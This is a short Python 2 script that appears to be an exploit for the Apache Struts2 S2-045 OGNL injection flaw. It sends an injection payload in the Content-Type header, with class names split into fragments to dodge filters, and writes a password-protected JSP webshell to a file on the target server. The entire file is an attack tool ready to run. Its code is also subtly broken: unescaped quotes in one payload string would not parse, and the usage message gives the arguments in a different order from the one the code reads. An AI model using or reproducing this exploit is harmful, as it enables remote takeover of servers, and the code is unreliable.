#!/usr/bin/python
# -*- coding: utf-8 -*-
# author HWHXY

import urllib2
import httplib


def exploit(url, cmd, path):
    payload =  "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "(#context.setMemberAccess(#dm)))."
    payload += "(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
    payload += "(#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'))."
    payload += "(#path='%s')." % path
    payload += "(#shell1='<%if("023".equals(request.getParameter("pwd"))){java.io.InputStrea')."
    payload += "(#shell2='m in = Runtim').(#shell3='e.getRuntim')."
    payload += "(#shell4='e().exec('%s')." % cmd
    payload += "(#cmd='%s')." % cmd
    payload += "(#file=new java.io.PrintWriter(#path))."
    payload += "(#file.println(#shell1+#shell2+#shell3+#shell4)."
    payload += "(#file.close())).(#o.close())}"

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        page = e.partial

    print(page)
    return page


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 4:
        print("[*] s-045_shell_bypass.py <url> <path> <cmd>")
    else:
        print('[*] let s write webshell in this web' )
        url = sys.argv[1]
        cmd = sys.argv[2]
        path= sys.argv[3]
        print("[*]  cmd: %s\n" % cmd)
        print("[*] path: %s\n" % path)
        exploit(url, cmd, path)
